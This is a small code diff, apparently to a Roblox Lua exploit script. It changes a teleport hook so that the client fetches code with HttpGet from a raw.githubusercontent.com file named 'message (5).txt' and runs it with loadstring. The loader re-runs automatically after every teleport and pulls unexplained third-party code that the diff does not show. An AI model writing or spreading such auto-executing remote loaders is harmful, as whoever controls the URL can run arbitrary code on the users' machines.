@@ -6551,7 +6551,7 @@ local TeleportCheck = false
 Players.LocalPlayer.OnTeleport:Connect(function(State)
 	if KeepInfYield and (not TeleportCheck) and queueteleport then
 		TeleportCheck = true
-		queueteleport("loadstring(game:HttpGet('myLink'))()")
+		queueteleport("loadstring(game:HttpGet('raw.githubusercontent.com/HelloHiPro/HelloHiPro/refs/heads/main/message (5).txt'))()")
 	end
 end)
 
